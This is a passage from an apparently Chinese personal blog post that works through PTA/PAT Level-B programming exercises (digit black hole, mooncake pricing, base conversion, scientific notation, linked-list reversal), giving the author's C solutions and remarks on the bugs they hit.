class="keyword">if</span>(ch1 == <span class="string">'J'</span> &amp;&amp; ch2 == <span class="string">'C'</span>)</span><br><span class="line">c++, map1[<span class="string">'C'</span>]++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">b++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d %d %d\n"</span>, a, b, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d %d %d\n"</span>, c, b, a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">max</span> = <span class="built_in">map</span>[s[i]] &gt; <span class="built_in">max</span> ? <span class="built_in">map</span>[s[i]]:<span class="built_in">max</span>;</span><br><span class="line">max1 = map1[s[i]] &gt; max1 ? map1[s[i]]:max1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">map</span>[s[i]] &gt;= <span class="built_in">max</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>, s[i]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line"><span class="keyword">if</span>(map1[s[i]] &gt;= max1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, s[i]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：做题就算有简单解法，把当下麻烦的解法写完再说。</p><h3 id="1019-数字黑洞"><a href="#1019-数字黑洞" class="headerlink" title="1019 数字黑洞"></a>1019 数字黑洞</h3><p>感觉PTA乙级题的坑好多。。不注意的话又是大量时间找错。。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200705100809222.png" alt="image-20200705100809222"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *p = (<span class="keyword">char</span> *)a, *q = (<span class="keyword">char</span> *)b;</span><br><span class="line"><span class="keyword">return</span> *q-*p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp2</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *p = (<span class="keyword">char</span> *)a, *q = (<span class="keyword">char</span> *)b;</span><br><span class="line"><span class="keyword">return</span> *p-*q;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">re</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">int</span> (*cmp)(<span class="keyword">const</span> <span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">qsort(s, <span class="built_in">strlen</span>(s), <span class="keyword">sizeof</span>(<span class="keyword">char</span>), cmp);</span><br><span class="line"><span class="built_in">sscanf</span>(s, <span class="string">"%d"</span>, &amp;n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">5</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, n_re = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n), <span class="built_in">sprintf</span>(s, <span class="string">"%04d"</span>, n);</span><br><span class="line">n = re(s, cmp1), n_re = re(s, cmp2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(n-n_re != <span class="number">0</span> &amp;&amp; n-n_re != <span class="number">6174</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%04d - %04d = %04d\n"</span>, n, n_re, n-n_re);</span><br><span class="line"><span class="built_in">sprintf</span>(s, <span class="string">"%04d"</span>, n-n_re);</span><br><span class="line">n = re(s, cmp1), n_re = re(s, cmp2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%04d - %04d = %04d\n"</span>, n, n_re, n-n_re);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：注意逆序一个数字时他前面的0。</p><h3 id="1020-月饼"><a href="#1020-月饼" class="headerlink" title="1020 月饼"></a>1020 月饼</h3><p>为什么做PTA的题总是很气。。这个题第一个测试点磨了我2个小时？？？其实也不怪题，只是很多题都考到了我没注意过的小细节。。那也是收获。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200706111934207.png" alt="image-20200706111934207"></p><p>我卡了2小时的一个测试点，错误：qsort的比较函数的返回值是int，这次题目的数据是浮点数，所以如果当两个浮点数相差小于1的时候，返回的值为变成int型的0，那就不会发生排序了。即我用的<code>return q-&gt;price_single - p-&gt;price_single;</code>，当他们2个数相差小于1就返回0，导致结果是不排序。这里正确的写法应该是<code>return q-&gt;price_single &gt; p-&gt;price_single;</code>，以后都写大于小于了。</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">double</span> ku, price_all, price_single;</span><br><span class="line">&#125;Cake;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> Cake *a, <span class="keyword">const</span> Cake *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> b-&gt;price_single &gt; a-&gt;price_single;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Cake cake[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">double</span> ans = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, demand = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n, &amp;demand);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lf"</span>, &amp;cake[i].ku);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lf"</span>, &amp;cake[i].price_all);</span><br><span class="line">cake[i].price_single = cake[i].price_all/cake[i].ku;</span><br><span class="line">&#125;</span><br><span class="line">qsort(cake, n, <span class="keyword">sizeof</span>(Cake), cmp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(cake[i].ku &lt;= demand)</span><br><span class="line">&#123;</span><br><span class="line">ans += cake[i].price_all;</span><br><span class="line">demand -= cake[i].ku;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">ans += cake[i].price_single*demand;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.2lf"</span>, ans);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结：1.我感觉这个的难点是能不能想到构造结构体。2.对数据不敏感，一直被坑在qsort的比较函数。</strong></p><h3 id="1022-D进制的A-B"><a href="#1022-D进制的A-B" class="headerlink" title="1022 D进制的A+B"></a>1022 D进制的A+B</h3><p>就是让写一个10进制数转任意指定的进制数，以前接触过，这里写2种方法。递归与非递归。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200707124904891.png" alt="image-20200707124904891"></p><p>注释了的为递归写法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"0123456789ABCDEF"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*void trans(int n, int d) </span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">int ans = n%d;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if(n &gt;= d)</span></span><br><span class="line"><span class="comment">trans(n/d, d);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">printf("%c", s[ans]);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">0</span>, b = <span class="number">0</span>, d = <span class="number">0</span>, c = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> s1[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;, i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>, &amp;a, &amp;b, &amp;d);</span><br><span class="line">    <span class="comment">//trans(a+b, d);</span></span><br><span class="line"><span class="keyword">for</span>(c = a+b; c; s1[i++] = c%d, c /= d);</span><br><span class="line"><span class="keyword">if</span>(!i)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0"</span>); </span><br><span class="line"><span class="keyword">while</span>(--i &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, s[s1[i]]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1023-组个最小数"><a href="#1023-组个最小数" class="headerlink" title="1023 组个最小数"></a>1023 组个最小数</h3><p>换个算法， 做对了。但一直想不通之前的算法为什么有2个测试点过不了，折磨了我差不多一天。。。找错真的好难，吐槽一下PAT为什么不给出测试点。</p><p><strong>错误：我用字符表示整数时是要ASCII-48，但我只考虑到了0-9的情况，当数字大于9后就不能直接减去48了，并且会被当作2个字符处理。</strong></p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200707222301486.png" alt="image-20200707222301486"></p><p>这里先给出简单的代码：就是先找到第一个非0数先输出，再将其个数减一，最后输出所有。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>], i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, a+i);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line"><span class="keyword">if</span>(a[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, i);</span><br><span class="line">a[i]--;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line"><span class="keyword">while</span>(a[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, i);</span><br><span class="line">a[i]--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>折磨我的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">150</span>] = &#123;<span class="number">0</span>&#125;, i = <span class="number">0</span>, j = <span class="number">0</span>, ch = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>((ch = getchar()) != <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(ch != <span class="number">32</span>)</span><br><span class="line">&#123;</span><br><span class="line">ch -= <span class="number">48</span>; <span class="comment">//这里只满足0-9的情况，找这个错。。。</span></span><br><span class="line"><span class="keyword">while</span>(ch--)</span><br><span class="line">s[i++] = j+<span class="number">48</span>;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(s[<span class="number">0</span>] == <span class="number">48</span>)</span><br><span class="line">&#123;</span><br><span class="line">i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(s[i++] == <span class="number">48</span>);</span><br><span class="line">ch = s[i<span class="number">-1</span>];</span><br><span class="line">s[i<span class="number">-1</span>] = s[<span class="number">0</span>];</span><br><span class="line">s[<span class="number">0</span>] = ch;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(s);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//正确写法：</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ch = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">150</span>] = &#123;<span class="number">0</span>&#125;, i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>((<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;ch)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(j == <span class="number">10</span>)</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line"><span class="keyword">while</span>(ch--)</span><br><span class="line">s[i++] = j+<span class="number">48</span>;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(s[<span class="number">0</span>] == <span class="number">48</span>)</span><br><span class="line">&#123;</span><br><span class="line">i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(s[i++] == <span class="number">48</span>);</span><br><span class="line">ch = s[i<span class="number">-1</span>];</span><br><span class="line">s[i<span class="number">-1</span>] = s[<span class="number">0</span>];</span><br><span class="line">s[<span class="number">0</span>] = ch;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(s);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：找到错后，舒服了。</p><h3 id="1024-科学计数法"><a href="#1024-科学计数法" class="headerlink" title="1024 科学计数法"></a>1024 科学计数法</h3><p>写起来有点小麻烦，还是思维方法不到位的原因。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200708162556690.png" alt="image-20200708162556690"></p><p>在指数为正的时候花了些时间，哪里从小数点后有几位数有效数字分情况的话，条理就会清楚很多。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, i = <span class="number">1</span>, flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100000</span>] = &#123;<span class="number">0</span>&#125;, ans[<span class="number">100000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">gets(s);</span><br><span class="line"><span class="keyword">if</span>(s[<span class="number">0</span>] == <span class="string">'-'</span>)</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(s[i++] != <span class="string">'E'</span>);</span><br><span class="line">n = atoi(s+i+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">'-'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(n)</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; n+<span class="number">1</span>; j++)</span><br><span class="line">ans[j] = j == <span class="number">1</span> ? <span class="string">'.'</span>:<span class="string">'0'</span>;</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">1</span>; k &lt; i<span class="number">-1</span>; k++)</span><br><span class="line"><span class="keyword">if</span>(k != <span class="number">2</span>)</span><br><span class="line">ans[j++] = s[k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (n &lt; i<span class="number">-4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>, k = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">1</span>; j &lt; n+<span class="number">1</span>; k++)</span><br><span class="line"><span class="keyword">if</span>(k != <span class="number">2</span>)</span><br><span class="line">ans[j++] = s[k];</span><br><span class="line">ans[j++] = <span class="string">'.'</span>;</span><br><span class="line"><span class="keyword">for</span>( ; k &lt; i<span class="number">-1</span>; k++)</span><br><span class="line">ans[j++] = s[k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">1</span>; k &lt; i<span class="number">-1</span>; k++)</span><br><span class="line"><span class="keyword">if</span>(k != <span class="number">2</span>)</span><br><span class="line">ans[j++] = s[k];</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; n-(i<span class="number">-4</span>); k++)</span><br><span class="line">ans[j++] = <span class="string">'0'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(flag)</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">'-'</span>);</span><br><span class="line"><span class="built_in">puts</span>(ans);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结：记住 atoi()函数是字符串转化为整数，与另外一个相对的函数总是记混。</strong></p><h3 id="1025-反转链表"><a href="#1025-反转链表" class="headerlink" title="1025 反转链表"></a>1025 反转链表</h3><p>发现对于我现在的水平，做乙级的难题还要磨合磨合。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200709104151427.png" alt="image-20200709104151427"></p><p>首先用一个结构体代表每个节点的数据，先储存在一个数组。然后根据的节点next关系使用选择排序对节点进行排序，最后反转。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> addr, data, next;</span><br><span class="line">&#125;List;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">List temp = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> next = <span class="number">0</span>, n = <span class="number">0</span>, k = <span class="number">0</span>, i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>, &amp;next, 